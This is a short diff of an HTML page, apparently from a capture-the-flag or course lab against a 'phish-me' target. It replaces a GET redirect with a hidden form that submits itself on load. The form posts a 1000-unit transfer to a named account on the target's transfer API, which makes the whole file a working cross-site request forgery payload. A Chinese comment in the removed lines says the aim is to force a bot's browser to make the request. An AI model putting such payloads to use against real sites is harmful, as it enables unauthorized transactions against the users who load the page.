@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting...</title>
-</head>
 <body>
+    <form id="csrf-form" action="https://phish-me.quoccacorp.com/api/transfer" method="POST" enctype="text/plain">
+        <input type="hidden" name="username" value="z5625996">
+        <input type="hidden" name="amount" value="1000">
+    </form>
     <script>
-        // 强制 Bot 的浏览器直接跳转到这个 GET 链接
-        window.location.href = "https://phish-me.quoccacorp.com/api/transfer?username=z5625996&amount=1000&csrf_token=NTUwMg==";
+        document.getElementById('csrf-form').submit();
     </script>
 </body>
 </html>
